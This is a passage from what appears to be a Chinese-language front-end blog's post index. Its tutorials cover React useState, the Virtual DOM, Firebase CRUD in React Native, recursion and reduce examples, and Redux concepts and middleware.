一些你可能會犯的錯誤因為 useState 的 setter 是非同步的，所以寫出一些錯誤的 code。 1. 想取得更新後的值 1234567891011121314export default function App() { const [testObject, setTestObject] = useState({ username: 'peanu', age: 20 }) const handleClick = () =&gt; { setTestObject((prev) =&gt; ({ ...prev, weight: 50 })) // 在這裡沒辦法拿到更新後的值 console.log('after update', testObject) }} 如果你真的想檢查，應該要利用 useEffect： 12345678910111213141516export default function App() { const [testObject, setTestObject] = useState({ username: 'peanu', age: 20 }) const handleClick = () =&gt; { setTestObject((prev) =&gt; ({ ...prev, weight: 50 })) } useEffect(() =&gt; { // re-render 完以後才能確保 state 是最新的值 console.log('after update', testObject) })} 2. 呼叫多次 setter 123456789101112131415161718export default function App() { const [testObject, setTestObject] = useState({ username: 'peanu', age: 20 }) const handleClick = () =&gt; { // 第一次 setTestObject({ ...testObject, weight: 50 }) // 第二次 setTestObject({ ...testObject, gender: 'man' }) }} 你可能會預期結果變成： 123456{ username: 'peanu', age: 20, weight: 50, gender: \"man\"} 但結果是這樣子： 簡單來說，你在跑第二個 setTestObject 的時候裡面的 ...testObject 還不是更新後的值，代表你是拿最原本的值來用，所以最後才會只有新增了 gender，但其實背後是兩個都有執行到的。 如果要避免這個問題，你可以改用 functional update 的方式來做（就是傳入 function 啦）： 12345678910111213141516export default function App() { const [testObject, setTestObject] = useState({ username: 'peanu', age: 20 }) const handleClick = () =&gt; { setTestObject((prev) =&gt; ({ ...prev, weight: 50 })) setTestObject((prev) =&gt; ({ ...prev, gender: 'man' })) }} 這樣就能變成你想要的樣子。 雖然我還不太知道原理是什麼，但總之先這樣做就對了。","link":"/2022/04/06/react-use-state/"},{"title":"什麼是 Virtual DOM？","text":"聽起來很厲害的感覺。 簡述先說重點： Virtual DOM 本身是一個 JavaScript 的「物件」 DOM 是瀏覽器所產生出來的「資料結構」 不要把這兩個東西搞混了。 會有 Virtual DOM 是因為直接操作 DOM 的成本很高，所以需要透過它來解決這個問題。 簡單來說，會先把原本的 DOM 複製一份變成 Virtual DOM。 Virtual DOM 的內容大概就這樣（只會存跟畫面比較有關的東西）： 12345678{ tagName: \"div\", attrs: { id: \"app\", class: \"container\" }, childrens: [&lt;vNode&gt;]} 而當畫面或資料改變時，就再產生一個新的 Virtual DOM，去跟舊的做比對（diff / Reconciliation），最後才去操作 DOM 把真的要改的地方改掉。 流程大概是這樣： 根據最開始的 DOM 來建立初始的 Virtual DOM 當 state 發生改變時，在產生一個新的 Virtual DOM 執行 diff 演算法，把新舊的 Virtual DOM 做比對 找出真正要改變的地方以後，才去操作 DOM 總之透過 Virtual DOM 的方式就可以省下操作 DOM 的成本。 關於 Diff 演算法Diff 演算法是用兩顆樹（一種資料結構）來做比對，但通常這個步驟非常繁瑣，就算是用最少步驟也得要 O(n³) 的時間複雜度才行，所以 React 不可能這樣做。 React 的做法是做了一些優化，第一種是像下圖這樣： 當它發現 A 下面的 B 消失時，會直接把 B 節點砍掉重練，直接生一個新的，不會再去比對 B 的子節點。 第二種是 key，就是在渲染一系列 component 的時候會加上的那個 key。它的用意就是要讓 diff 時可以有一個根據，更快的找出哪裡發生了改變。","link":"/2022/04/07/react-virtual-dom/"},{"title":"React Native－串接 Firebase","text":"終於來填這個坑。 解到死的 bug（React Native）放置頂是因為當初一直找不到關鍵字來解這個 bug，所以花了一段時間才解出來。 總之呢，這個 bug 是只要把 firebase 引入來用時，就會出現編譯失敗然後顯示下面的錯誤訊息： While trying to resolve module ‘idb’ from file … the package was successfully found. However, this package itself specifies a main module field that could not be resolved.Indeed, none of these files exist: 簡單來說這是因為 firebase 使用 .cjs 的副檔名，而 Expo 跟 React Native 不支援，所以你要手動調整一些設定來讓他們支援。 在根目錄建立 metro.config.js，填入底下內容： 12345678const { getDefaultConfig } = require(\"@expo/metro-config\");const defaultConfig = getDefaultConfig(__dirname);// push .cjs 這個副檔名defaultConfig.resolver.assetExts.push(\"cjs\");module.exports = defaultConfig; 如果是 React Native cli 的話： 123456789const { getDefaultConfig } = require(\"metro-config\");const { resolver: defaultResolver } = getDefaultConfig.getDefaultValues();exports.resolver = { ...defaultResolver, sourceExts: [ ...defaultResolver.sourceExts, \"cjs\", ],}; 這樣就解決了，詳細可以參考 官方文件 或這篇 討論。 基礎概念Firebase 中有兩個主要的東西： collection 可以想成是 table 的感覺 document 可以想成是欄位的意思 Firebase 是透過「路徑」來表示資料庫，比如說我有這樣的東西： 把資料轉換成網址的話就會像上面這張圖一樣。 懶人包 APIgeneral initializeApp 初始化，initializeApp(firebaseConfig) getFirestore 建立 DB 的 reference，getFirestore(app) doc 建立 document 的 reference getDoc 取得單一個 document（注意沒有 s） getDocs 一次取得 collection 中的所有 document setDoc 建立或更新 document deleteDoc 刪除 document collection 用來設定 reference 的方法，例如：collection(db, 'orders') serverTimestamp 取得時間戳（可用來設定 createdAt） query 相關 query 拿來下指令 orderBy 排序 limit 限制數量 前置作業首先：expo install firebase 附註：建議裝的套件 npm install tslib（能避免噴 Error） 先建立專案 跳轉後選擇「web」來建立 App 把 config 的內容記下來，等一下會用到 建立 database 從側邊欄點選「firestore database」 點選「建立資料庫」 點選「已測試模式啟動」 點選「啟用」 完成後就可以建立 collection（table） 了。 如果想要設定一些限制，可以到「規則」這個 tab 來設定。 跟資料庫連線（初始化）詳細可以參考這個官方文件 12345678910111213141516import { initializeApp } from \"firebase/app\";import { getFirestore } from \"firebase/firestore\";const firebaseConfig = { apiKey: \"...\", authDomain: \"...\", projectId: \"...\", storageBucket: \"...\", messagingSenderId: \"...\", appId: \"...\"};// Initialize Firebaseconst app = initializeApp(firebaseConfig);// Db reference（後續的操作都會透過他來做）export const db = getFirestore(app); 基本的 CRUDCreate（setDoc）1234567891011121314151617181920212223import { db } from \"../firebase\";import { doc, setDoc } from \"firebase/firestore\";export default function Com1 () { const create = () =&gt; { // document Reference const docRef = doc(db, 'MyCollection', 'MyDocument'); // 要輸入的資料 const docData = { name: 'PeaNu', age: 30, job: 'Front-End' } // Send request to firebase setDoc(docRef, docData) .then(() =&gt; alert('Create Succuess!')) .catch(err =&gt; alert(err.message)) } return &lt;button onClick={create}&gt;Create Document&lt;/button&gt;} Read（getDoc）123456789101112131415161718192021222324252627282930313233343536373839import { db } from \"../firebase\";import { doc, setDoc, getDoc } from \"firebase/firestore\";import { useEffect, useState } from \"react\";export default function Com1 () { // Store user data const [user, setUser] = useState(null); const read = () =&gt; { // document Reference const docRef = doc(db, 'MyCollection', 'MyDocument'); getDoc(docRef) .then(snapshot =&gt; { // Check if data exists or not if (snapshot.exists()) { setUser(snapshot.data()); } else { alert('No doc found'); } }) .catch(err =&gt; alert(err.message)) } return ( &lt;&gt; {user &amp;&amp; ( &lt;div&gt; &lt;h2&gt;Name: {user.name}&lt;/h2&gt; &lt;p&gt;Age: {user.age}&lt;/p&gt; &lt;p&gt;Job: {user.job}&lt;/p&gt; &lt;/div&gt; )} &lt;button onClick={read}&gt;Read Document&lt;/button&gt; &lt;/&gt; )} 如果 collection 或 document 不存在的話就會幫你建立一個新的。反之，如果存在的話就會幫你把內容更新。 Update（setDoc）一樣是用 setDoc 這個方法，不過會稍微做點變化： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859import { db } from \"../firebase\";import { doc, setDoc, getDoc } from \"firebase/firestore\";import { useState } from \"react\";export default function Com1 () { // Store user data const [user, setUser] = useState(null); // Store input value const [value, setValue] = useState(\"\"); const read = () =&gt; { const docRef = doc(db, 'MyCollection', 'MyDocument'); getDoc(docRef) .then(snapshot =&gt; { if (snapshot.exists()) { setUser(snapshot.data()); } else { alert('No doc found'); } }) .catch(err =&gt; alert(err.message)) } const update = (data, merge) =&gt; { const docRef = doc(db, 'MyCollection', 'MyDocument'); // merge: true = 只更新部分資料 // merge: false = 整筆覆寫 setDoc(docRef, data, { merge: merge }) .then(() =&gt; { alert('Update Success') // reload screen when finish update read() }) .catch(err =&gt; alert(err.message)) } return ( &lt;&gt; {user &amp;&amp; ( &lt;div&gt; &lt;h2&gt;Name: {user.name}&lt;/h2&gt; &lt;p&gt;Age: {user.age}&lt;/p&gt; &lt;p&gt;Job: {user.job}&lt;/p&gt; &lt;/div&gt; )} &lt;button onClick={() =&gt; update({name: value}, true)}&gt;Update Document&lt;/button&gt; &lt;input style={{ display: 'block', margin: '20px 0'}} type=\"text\" placeholder=\"Update name\" onChange={e =&gt; setValue(e.target.value)} value={value} /&gt; &lt;/&gt; )} Delete（deleteDoc）刪除總是最單純： 123456789101112131415161718import { db } from \"../firebase\";import { doc, deleteDoc } from \"firebase/firestore\";export default function Com1 () { const Delete = () =&gt; { const docRef = doc(db, 'MyCollection', 'MyDocument'); deleteDoc(docRef) .then(() =&gt; { alert('Delete Success'); }) .catch(err =&gt; alert(err.message)) } return &lt;button onClick={Delete}&gt;Delete Document&lt;/button&gt; )} 複雜一點的操作（下 Query）假設我的需求是這樣： 抓出 collection 中的所有 document 根據 document 資料裡的時間戳排序，取出最新的一筆資料 這就會用到 query，一個可以讓我們下指令的方法： 123456789101112131415161718import { db } from \"../firebase\";import { getDocs, collection, query, orderBy, limit } from \"firebase/firestore\";import { useEffect } from \"react\";export default function Com1 () { useEffect(() =&gt; { const q = query(collection(db, 'orders'), orderBy('createdAt', 'desc'), limit(1)); getDocs(q).then(querySnapshot =&gt; { querySnapshot.forEach(document =&gt; { console.log('Document', document.data()); }) }) }, []) return (...)} 這邊要特別注意，如果你試著用 console.log(querySnapshot) 是拿不到真正的資料的，因為在 firebase 中「取值」這件事都得透過 getter，所以才會用 forEach 搭配 .data() 來取出 document 的值。 參考資料 官方文件 幫助很大的 CRUD 影片 Debug 的討論","link":"/2022/06/04/react-with-firebase/"},{"title":"實作遞迴函式","text":"一些簡單的遞迴範例。 簡述關於遞迴的套路： 幾乎都是在呼叫 function 的時候「把參數值更新」來做出像迴圈一樣的效果。 要求出 A 的值，就先找出 A-1 的值 一直「往前」找，找到最後的終止條件為止。 求出某數的 N 次方123456789function power(base, exponent) { if (exponent &gt; 0) { return base * power(base, exponent-1) } else { return 1 }}var result = power(2, 31)console.log(result) // 2147483648 不懂得話參考一下你自己亂畫的圖： 求出階層12345678910function factorial (n) { if (n &gt; 1) { return n * factorial(n-1) } else { return 1 }}var result = factorial(5)console.log(result) 費式數列12345678function fab(n) { if(n &lt; 2) { return n } else { return fab(n-1) + fab(n-2) }}console.log(fab(10)) 清除 DOM 的文字節點123456789101112131415161718192021222324252627282930/* cleanJunkNodes 會接收一個節點： 1. 取得該節點下的所有子節點 2. 判斷子節點的值 3. 如果是沒用的節點就刪掉*/function cleanJunkNodes (node) { // 遍歷所有子節點 for (let i=0; i&lt;node.childNodes.length; i++) { // 存取第 i 個子節點 let child = node.childNodes[i] // 如果是註解 or 文字節點（只有空白字元） if ( child.nodeType === 8 || child.nodeType === 3 &amp;&amp; !/\\S/.test(child.nodeValue) ) { // 刪除子節點 node.removeChild(child) // 往前退一格（因為長度變短了） i-- } else if (child.nodeType === 1) { // 如果子節點也是元素，丟到遞迴 cleanJunkNodes 清除垃圾節點 cleanJunkNodes(child) } }} 二分搜尋法1234567891011121314151617181920212223242526272829303132333435363738// 要遞迴的 function function binarySearchRecursively(array, targetElement, start, end) { // 左邊界 &gt; 右邊界 if (start &gt; end) { return -1 } // 中間位置（無條件捨去，取偏左邊那點） const middle = (start + end) &gt;&gt; 1 /* 目標 = 中間那個數字： 找到數字了，直接回傳位置 目標 &gt; 中間的數字： 代表前面的數字不用看了，把 start 設為中間位置往右移一位（+1） 目標 &lt; 中間的數字： 代表後面的數字不用看了，把 end 設為中間位置往左移一位（-1） */ if (targetElement === array[middle]) { return middle } else if (targetElement &gt; array[middle]) { // 更新 start 後，遞迴 binarySearchRecursively return binarySearchRecursively(array, targetElement, middle + 1, end) } else { // 更新 end 後，遞迴 binarySearchRecursively return binarySearchRecursively(array, targetElement, start, middle - 1) }}// 用來執行 binarySearchRecursivelyfunction binarySearch(array, targetElement) { return binarySearchRecursively(array, targetElement, 0, array.length-1)}const numbers = [1, 3, 24, 33, 57, 88, 99, 101]console.log(binarySearch(numbers, 25)) // -1console.log(binarySearch(numbers, 24)) // 2 快速排序法1234567891011121314151617181920212223242526272829function quickSort(arr) { // 停止點，當 arr 長度為 1 或沒有元素了 if (arr.length &lt;= 1) { return arr } // 基準點 index const pivotIndex = Math.floor(arr.length / 2) // 基準點 number const pivotNumber = arr.splice(pivotIndex, 1)[0] // 比基準點小的數列 let samllerNumbers = [] // 比基準點大的數列 let biggerNumbers = [] // 把小的放到 samll，大的放到 bigger for (let i=0; i&lt;arr.length; i++) { if (arr[i] &lt; pivotNumber) { samllerNumbers.push(arr[i]) } else { biggerNumbers.push(arr[i]) } } // 把小的跟大的都丟到 quickSort 遞迴，最後要跟 pivot 結合起來 return quickSort(samllerNumbers).concat([pivotNumber], quickSort(biggerNumbers))}const numbers = [5, 44, 23, 3, 42, 4, 2]console.log(quickSort(numbers)) 壓平陣列1234567891011121314151617181920212223function flatten(arr) { // 儲存壓平後的陣列 const result = [] // 遍歷陣列元素 arr.forEach(item =&gt; { // 如果元素是陣列，遞迴這個 function if(Array.isArray(item)) { // 呼叫自己 const flattenArray = flatten(item) // 把壓平後的陣列 push 回結果 flattenArray.forEach(item =&gt; result.push(item)) } else { result.push(item) } }) // 回傳結果 return result}console.log(flatten([1, 2, 3])) // [1, 2, 3]console.log(flatten([1, 2, 3, [1, 2], [3, 4], 5])) // [1, 2, 3, 1, 2, 3, 4, 5]console.log(flatten([1, 2, 3, [1, [2]], [3, 4, [5]], 6])) // [1, 2, 3, 1, 2, 3, 4, 5, 6]console.log(flatten(['1,', 2, 3])) // ['1,', 2, 3] 實作 DOM 的 closest 方法12345678910111213function closestRecursive(node, className) { // 如果節點不存在 or 不包含 class // 回傳 null 代表找到底了 if (!node || !node.classList) { return null } // 如果符合 className，代表找到了 if (node.classList.contains(className)) { return node } // 還沒找完，繼續往上一層找 return closestRecursive(node.parentNode, className)} 類似 setInterval 的 setTimeout1234567function log(i) { console.log(i) setTimeout(() =&gt; { log(++i) }, 1000)}log(1)","link":"/2021/12/19/recursive/"},{"title":"reduce 的其他玩法","text":"紀錄一下，Array.reduce 這個方法能做的事情還蠻多的。 建立物件12345678const arr = [1, 2, 3, 4, 5]const result = arr.reduce((acc, elem) =&gt; { // 先修改 accumulator 的值 acc['A'+elem] = elem // 修改後在 return 回去 return acc}, {})console.log(result) // {A1: 1, A2: 2, A3: 3, A4: 4, A5: 5} 計算小於 n 的總和1234567891011121314const arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]const result = arr.reduce((acc, elem) =&gt; { // 把小於 5 的元素加到 accumulator if(elem &lt; 5) { // 先更新值 acc = acc + elem // 再回傳 return acc } else { // 不更新直接回傳 return acc }}, 0)console.log(result) // 10 建立小於 n 陣列1234567891011121314const arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]const result = arr.reduce((acc, elem) =&gt; { // 把小於 5 的元素加到 accumulator if(elem &lt; 5) { // 先更新值 acc.push(elem) // 再回傳 return acc } else { // 不更新直接回傳 return acc }}, [])console.log(result) // [1, 2, 3, 4]","link":"/2022/01/01/reduce-usage/"},{"title":"初探 Redux","text":"做了好多次練習。 簡述這邊會跟著 Redux 官方文件 來跑一次流程。 在介紹之前，讓我在強調一次： Redux 並沒有跟 React 綁在一起 Redux 並沒有跟 React 綁在一起 Redux 並沒有跟 React 綁在一起 我在學之前也以為他是專屬於 React 的東西，畢竟是以「Re」開頭的嘛。 總之呢，它只是一個基於 flux 打造的 library，用來「管理狀態」。你可以搭配 Vanilla JS 來用，或甚至是別的程式語言也可以。 從四大要素開始這邊先簡單介紹 Redux 裡面幾個主要的角色： store（透過 reducer 來建立） reducer（跟 array 的 reduce 概念很相似） action（一個 Object，會有 type 跟 payload） dispatch（透過它來發出 action 給 reducer） 等一下的範例會一一介紹它們是幹嘛用的，廢話不多說，開始吧！ 這邊的範例很簡單，只需要寫一隻檔案就行了，所以直接附上 code： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172import { createStore } from 'redux';// state（初始值）const initState = { todos: []}let id = 0;// reducerfunction todosReducer (state = initState, action) { switch (action.type) { // action case \"addTodo\": return { ...state, todos: [ ...state.todos, { id: id++, name: action.payload.name, } ] } // action case \"deleteTodo\": return { ...state, todos: state.todos.filter(todo =&gt; todo.id !== action.payload.id) } default: return state }}// store（用 reducer 建立）const store = createStore(todosReducer);// 這個待會再解釋store.subscribe(() =&gt; { console.log('Change!'); console.log(store.getState());})// 下面都是 dispatchstore.dispatch({ type: 'addTodo', payload: { name: 'todo1' }})store.dispatch({ type: 'addTodo', payload: { name: 'todo2' }})store.dispatch({ type: 'addTodo', payload: { name: 'todo3' }})store.dispatch({ type: 'deleteTodo', payload: { id: 1 }}) 要建立一個 store 的第一步是先寫好「reducer」，這個範例的 reducer 是 todosReducer 這個 function。 簡單來說，reducer 就是一個用來「產生 state」的東西，只要給他對應的 「action」，它就吐給你對應的 state。 至於 reducer 裡面要做什麼處理是我們自己決定的，像是我們希望接收到 addTodo 這個 action 時，就新增一筆 todo 到 state 裡面，所以才會有這段： 1234567891011121314switch (action.type) { case: 'addTodo': return { ...state, todos: [ ...state.todos, { id: id++, name: action.payload, } ] } // ...} 後面的 deleteTodo 也是以此類推。 定義好 reducer 以後，只要把它丟到 Redux 提供的 createStore，store 就建立好了，就是這麼簡單。 1const store = createStore(todosReducer); 接下來，每當我想要對 store 裡面的東西做事情，就得透過「dispatch」+「action」才可以： 123456store.dispatch({ type: 'addTodo', payload: { name: 'todo1' }}) 這一段的意思就是說「我想執行 addTodo 這個 action」，麻煩幫我 dispatch（指派）給 reducer。 眼尖一點就會注意到 action 其實只是一個 Object，裡面會放 type 跟 payload 這兩個 key，代表我想做的事情跟額外資訊。 所以當我 dispatch 這個 action 以後，reducer 就會吐給我新的 state，它應該要長的像這樣： 12345{ todos: [ { id: 0, name: 'todo1' } ]} 以上就是最基本的流程，沒有很複雜，本質就是這樣而已。 至於這一段： 1234store.subscribe(() =&gt; { console.log('Change!'); console.log(store.getState());}) 其實就跟 addEventLisener() 87 分像，它的意思是「當 state 改變的時候幫我 call 這個 function」： 12button.addEventListender(() =&gt; ...);store.subscribe(() =&gt; ...); 就這樣而已。 最後是做個補充，當我們在 Reducer 裡面更新 state 時，一定要用 Immutable 的方式來改變，這邊先示範一個錯誤的範例： 1234567891011121314151617181920const initState = { // 現在多加一個 email email: '12345@gmail.com', todos: []}function reducer(state, action) { switch (action.type) { case: 'addTodo' // 忽略了 email 的部分 return { todos: [ ...state.todos, {name: action.payload.name} ] } default: return state }} 這樣子更新後的 state 就會變成： 123{ todos: [{ name: 'xxx'}]} 為什麼？我說過一定要用 Immutable 的方式來改變 state，而剛剛在 reducer 裡面回傳的只有 todos，所以 email 就消失了。 正確的做法應該是這樣子： 123456789101112131415161718192021const initState = { email: '12345@gmail.com', todos: []}function reducer(state, action) { switch (action.type) { case: 'addTodo' return { // 先複製原本的 state ...state, // 再去改我想要改的 state todos: [ ...state.todos, {name: action.payload.name} ] } default: return state }} 這就跟在用 useState 的概念是一樣的，不要忘記囉！ 來做點優化，加上 action type 與 action creator前面雖然已經介紹過 Redux 的基本用法，不過應該能注意到幾個小問題： action 是用「純字串」來寫的，那打錯字怎麼辦？ 每次 dispatch 都要傳一包 Object 是不是有點太 hard code 了？ Action Type首先是第一個問題，這其實蠻困擾的，因為假設我哪天打錯字的話： 1234567store.dispatch({ // 多一個 s type: 'addTodos' payload: { name: 'PeaNu' }}) 這樣是不會出跳出任何錯誤的，因為對 reducer 而言 addTodos 只是一個不存在的 case，所以只會跳到 default 區塊而已。但這樣麻煩可就大了，因為你可能根本不知道是自己打錯字的關係。 所以更好的做法是改用「Action Type」，其實就只是建立一個 constant 啦： 1234const actionTypes = { ADD_TODO: 'addTodo', DELETE_TODO: 'deleteTodo'} 接著就可以去把原本的 action 修改成這樣： 123456789101112131415161718192021222324252627282930313233// 1. reducer 裡的 action function todosReducer (state = initState, action) { switch (action.type) { // 新增 todo case actionTypes.ADD_TODO: return { ...state, todos: [ ...state.todos, { id: id++, name: action.payload.name, } ] } // 刪除 todo case actionTypes.DELETE_TODO: return { ...state, todos: state.todos.filter(todo =&gt; todo.id !== action.payload.id) } default: return state }}// 2. dispatch 的 action，其他以此類推store.dispatch({ type: actionTypes.ADD_TODO, payload: { name: 'todo1' }}) 現在把 action 都改成變數以後，如果我又打錯字，系統就會直接噴 Error 跟我說Action may not have a undefined type property 之類的，不會再有原本那種找不出 bug 的麻煩。 Action creator接著是第二個問題，如果每次 dispatch 都要這樣寫的話真的蠻麻煩的： 123456store.dispatch({ type: actionTypes.ADD_TODO, payload: { name: 'todo1' }}) 如果可以寫成這樣的話世界是不是會更好？ 1store.dispatch(addTodo('todo1')); 有辦法做到嗎？其實剛剛有暗示過，你只要想想 action 的本質，就會發現要做到這點並不困難。 剛剛說過，action 的本質只是一個 Object，所以我們只要寫一個可以回傳對應 Object 的 function 不就好了嗎？ 123456789function addTodo(name) { // 這邊回傳的東西就是 action（Object） return { type: ActionTypes.ADD_TODO, payload: { name } }} 這種做法就叫做「Action creator」，講白話一點就是把 action 要傳的內容改用 function 來寫而已。 總之呢，只要改用這種方式優化後，你的 code 就會乾淨許多，也比較好維護。 最後應證一下我最開始說的，Redux 並沒有一定要跟 React 綁在一起用，所以這邊附上一個用 Vanilla JS + Redux 寫的 todo 範例，如果有任何疑惑就去看看吧。","link":"/2022/04/23/redux-basic/"},{"title":"使用 redux-devtool 的小提醒","text":"寫下來才不會忘。 簡述簡單來說就是一個讓你檢查 redux 運作的工具，只是想提醒下面這件事。 請記得一定要在 store.js 裡加上這段才能正常運作： 1234export default createStore( rootReducer, window.__REDUX_DEVTOOLS_EXTENSION__ &amp;&amp; window.__REDUX_DEVTOOLS_EXTENSION__());","link":"/2022/04/24/redux-devtool/"},{"title":"用實作的方式來重新學習 Redux","text":"再次突破眼界。 簡述在我們要跨組件溝通時，很常會愈到「props drilling」的問題，所以為了解決這個問題就有了 Redux 或 Context 的出現。 最近正好看了一部教學講的很不錯，裡面是從實作 Redux 底層的觀念來帶你認識 Redux。我覺得這種循序漸進的方式還蠻不錯的，所以才會寫下這篇來記錄。 如果你已經學過 Redux 的話，這篇應該就不難懂，沒學過的話可能會需要多花一點時間來理解。 總而言之，讓我們馬上來試試看吧。 從 globalState 開始首先先建立一個 globalState.js，它的用途就是拿來放置 state，所以 Component 只要透過這個檔案來拿就好了。 最基本的內容如下： 1234567export let globalState = { counter: 0,};export const setGlobalState = (newState) =&gt; { globalState = newState;}; 接著只要在對應的 Component 引入 globalState 和 setGlobalState 就可以對這裡面的東西做存取或操作。 這邊先說明一下組件結構，大概是長這樣： App Wrapper Counter Button Counter 負責顯示數字，Button 則是負責用來改變 state 的按鈕。 接著就透過 globalState 來串接到 Component，所以這時候兩者的內容大概會如下： 12345678910111213// Counterimport React, { Component } from \"react\";import { globalState } from \"./globalState\";export default class Counter extends Component { state = { counter: globalState.counter, } render() { return &lt;h2&gt;Counter: {this.state.counter}&lt;/h2&gt; }} 123456789101112131415// Buttonimport React, { Component } from \"react\";import { setGlobalState } from \"./globalState\";export default class Button extends Component { handleClick = () =&gt; { setGlobalState({ counter: Math.random() }) } render() { return &lt;button onClick={this.handleClick}&gt;add&lt;/button&gt; }} 做到這邊以後，目前的情況應該是這樣： 畫面會顯示 Counter: 0 按下按鈕後會觸發 setGlobalState 更新 globalState 只不過有一個問題，就是畫面不會更新。 原因很簡單，雖然我們確實是改變了 globalState 裡的值，可是又沒有改變 Component 裡面的 state，所以當然不會觸發 re-render。 那該怎麼辦？我們可以在 globalState 加上幾個東西： subscribe notifyAll 關於這兩個東西的用途，我直接寫在註解裡： 123456789101112131415161718192021222324// 所有訂閱 globalState 的人傳進來的 functionconst callbacks = [];export let globalState = { counter: 0,};// 把所有人的 callback 執行一遍，並把更新後的 state 傳進去const notifyAll = () =&gt; { for (let i = 0; i &lt; callbacks.length; i++) { callbacks[i](globalState); }};// 要訂閱的人就傳一個 callback 進來export const subscribe = (callback) =&gt; { callbacks.push(callback);};export const setGlobalState = (newState) =&gt; { globalState = newState; // 更新後通知所有訂閱者 notifyAll();}; 簡單來說，Component 可以透過 subscribe 來訂閱，訂閱的意思就是「當 globalState 改變的時候，通知我一聲」。那要怎麼通知？JS 寫久的話應該都不陌生，就是用 callback 嘛，所以 subscribe 這個 function 要做的事就是： 接收一個 callback 把這個 callback 儲存起來（放到 callbacks 這個陣列） 而 notifyAll 要做的事情只是把所有 callback 執行一遍而已，並且把把最新的 globalState 當作參數傳進去，接著 Component 就可以透過 callback 拿到。 所以呢，這邊只要修改一下 Counter 就好： 1234567891011121314151617181920212223import React, { Component } from \"react\";import { globalState, subscribe } from \"./globalState\";export default class Counter extends Component { state = { counter: globalState.counter, } // mount 後訂閱 componentDidMount() { subscribe(this.updateCounter); } // 收到通知時，要執行的 callback updateCounter = newState =&gt; { this.setState(newState); }; render() { return &lt;h2&gt;Counter: {this.state.counter}&lt;/h2&gt; }} 做到目前為止，畫面應該要可以隨著 globalState 做更新，有任何問題的話可以到我寫的範例參考。 認識 HOC（Higher Order Component）剛剛的例子已經把 state 和 Component 給串起來了，不過有個問題是「每一個 Component 如果都要自己加上 state = {...} 和 subscribe 的話」，其實還蠻點麻煩的，所以這邊就要用 HOC 的概念來改寫剛剛的範例。 附註：HOC 其實就是用 Component 包住後再把 props 傳下去而已，不用想得太複雜。 先來寫一個 utils，用來包裝用的： 123456789101112131415161718192021222324// HocCreator.jsimport { globalState, subscribe } from \"./globalState\"import React, { Component } from \"react\"// 接收一個 Componentexport function connect (Comp) { // smart component class Hoc extends Component { state = { counter: globalState.counter } componentDidMount () { subscribe(this.updateState) } updateState = newState =&gt; { this.setState(newState) } // 把 state 當作 props 傳下去 render () { return &lt;Comp {...this.state} /&gt; } } return Hoc} 接著只要把會用到 globalState 的 Component 包裝起來就好了： 1234567891011import React, { Component } from \"react\";import { connect } from \"./HocCreator\"class Counter extends Component { // 現在只要從 props 把 state 拿出來用就行了 render() { return &lt;h2&gt;Counter: {this.props.counter}&lt;/h2&gt; }}export default connect(Counter); 透過指令來修改 state現在又有一個新的問題，就是「如果被別人改到 state 怎麼辦」，像這樣： 1234567891011121314151617181920import React, { Component } from \"react\";import { setGlobalState } from \"./globalState\";// 假設原本的 state 長這樣：// globalState: {// counter: 0,// text: 'abc'// }class OtherGuysComponent extends Component { render() { return &lt;button onClick={() { setGlobalState({ text: '12345' }) }}&gt;change global state&lt;/button&gt; }}export default connect(OtherGuysComponent); 這樣 counter 就會在 setGlobalState 的時候被覆寫掉，然後就消失了。 所以要解決這個問題，可以改成「透過指令」的方式來更新 state（如果你學過 redux 的話，其實這就是 dispatch 的概念） 實作方法也不難，我們預期 Component 會這樣子用： 1234567891011121314151617import React, { Component } from \"react\";import { setGlobalState } from \"./globalState\";class OtherGuysComponent extends Component { render() { return &lt;button onClick={() { // 傳入一個 action，裡面包含 type 跟 payload 的資訊 dispatch({ type: 'UPDATE_TEXT', payload: '12345' }) }}&gt;change global state&lt;/button&gt; }}export default connect(OtherGuysComponent); 接著回到 globalState 的部分來實作 dispatch 這個 function： 1234567891011// globalState.jsexport const dispatch = (action) =&gt; { // 根據 action type 來更新部分的 state if (action.type === 'UPDATE_TEXT') { globalState.text = action.payload } else if (action.type === 'ADD_COUNTER') { globalState.counter = globalState.counter + action.payload } // 最後記得一樣要發通知 notifyAll();}; 接下來是 actionType 和 action creator 的優化，就不特別寫出來了，忘記的話可以看 這篇 來複習。 最後一塊拼圖 reducer其實就是把剛剛的東西做最後優化，先來複習一下剛剛的進度： 123456789101112131415export let globalState = { text: '12345', counter: 0,};export const dispatch = (action) =&gt; { // 根據 action type 來更新部分 state if (action.type === 'UPDATE_TEXT') { globalState.text = action.payload } else if (action.type === 'ADD_COUNTER') { globalState.counter = globalState.counter + action.payload } // 記得一樣要發通知 notifyAll()}; 我們希望優化成這樣子： 123456export const dispatch = (action) =&gt; { // 加上 reducer globalState = reducer(globalState, action); // 發通知 notifyAll()} 所以換句話說 reducer 的作用就是： 12// 把 state 跟 action 丟進去以後，回傳新的 statenewState = reducer(currentState, action); 所以最後只要把 reducer 實作出來就好了： 12345678910111213141516function reducer (state, action) { switch (action.type) { case ADD_COUNTER: return { ...state, counter: state.counter + action.payload } case UPDATE_TEXT: return { ...state, text: action.payload } default: return state }} 好，關於實作的部分到這邊就完成了！同時你也學會了 redux 的幾個核心理念： store action reducer dispatch 經過實作以後，有更清楚整個來龍去脈，我覺得還蠻不錯的。如果想參考最後的成果可以到 這邊 看。","link":"/2022/05/18/redux-implementation/"},{"title":"Redux middleware","text":"又是 middleware。 簡述就跟 Express 裡面的 middleware 差不多，Express 的 middleware 是把 request 經過處理後再回傳 response，在 reudx 的 middleware 則是把 action 先經過一段處理後再丟給 reducer 來處理。 簡單來說，原本我們的 action 只能是一個 Object： 12345678910const ADD_TODO = 'addTodo'function addTodo(name) { return { type: ADD_TODO, payload: { name } }} 但加上 middleware 以後，action 變成可以是一個 function： 1234567function addTodoAsync (name) { return function (dispatch) { setTimeout(() =&gt; { dispatch(addTodo(name)); }, 1000) }} 這個 function 會被傳入一個 dispatch，你只要把真正要 dispatch 的actionn 寫在裡面就行了。而這也就是 redux-think 這套 middleware 在做的事情 幫你執行 function 就這樣，沒了。 如果還是不太清楚的話，建議參考官方文件的圖，非常一目了然。 範例這邊沿用 用 Redux-toolkit 串接 React 和 Redux 的範例來做個簡單的示範： 12345678910111213141516171819202122232425262728293031323334353637import { createSlice } from \"@reduxjs/toolkit\";const initialState = { todos: []}let id = 0;export const todosSlice = 